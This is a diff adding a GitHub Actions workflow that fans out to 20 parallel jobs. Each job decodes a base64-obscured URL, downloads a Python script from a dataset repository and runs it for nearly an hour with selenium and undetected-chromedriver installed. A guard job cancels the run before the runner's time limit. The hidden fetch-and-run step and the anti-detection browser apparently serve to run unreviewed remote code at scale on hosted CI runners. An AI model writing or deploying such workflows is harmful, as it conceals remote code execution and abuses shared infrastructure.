@@ -1,0 +1,90 @@
+name: Dynamic Task Orchestrator
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: job-pipeline-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Guard: إنهاء التشغيل عند تجاوز حد 59 دقيقة
+  # =================================================================
+  runtime-guard:
+    name: "Runtime Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_WAIT_TIME: 3540
+    steps:
+      - name: Monitor Execution Window
+        run: |
+          echo "Starting runtime monitor for workflow run: ${{ github.run_id }}"
+          
+          sleep "${MAX_WAIT_TIME}"
+
+          echo "Execution window expired. Triggering run cancellation..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+  # =================================================================
+  # Matrix Dispatch: تشغيل وحدات المعالجة
+  # =================================================================
+  matrix-dispatch:
+    name: "MatrixUnit-${{ matrix.unit_index }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_index: [A01, A02, A03, A04, A05, A06, A07, A08, A09, A10, A11, A12, A13, A14, A15, A16, A17, A18, A19, A20]
+
+    steps:
+      # -----------------------------------------------------------------
+      # 1. تهيئة حزم التشغيل
+      # -----------------------------------------------------------------
+      - name: Bootstrap System Dependencies
+        run: |
+          export DEBIAN_FRONTEND=noninteractive
+          sudo apt-get update -y
+          sudo apt-get install -y python3-pip curl
+
+      # -----------------------------------------------------------------
+      # 2. استخراج وجلب السكريبت
+      # -----------------------------------------------------------------
+      - name: Download Processing Module
+        run: |
+          TARGET_URI=$(python3 -c "import base64; print(base64.b64decode('aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5').decode('utf-8'))")
+          curl -sL "$TARGET_URI" -o core_script.py
+
+      # -----------------------------------------------------------------
+      # 3. تثبيت المكتبات البرمجية
+      # -----------------------------------------------------------------
+      - name: Install Python Modules
+        run: |
+          python3 -m pip install --upgrade pip
+          pip3 install psutil requests selenium undetected-chromedriver
+
+      # -----------------------------------------------------------------
+      # 4. تشغيل وإدارة حياة السكريبت
+      # -----------------------------------------------------------------
+      - name: Run Core Process
+        run: |
+          python3 core_script.py &
+          PROC_PID=$!
+
+          sleep 3540
+
+          if kill -s 0 "$PROC_PID" 2>/dev/null; then
+            kill -9 "$PROC_PID"
+          fi
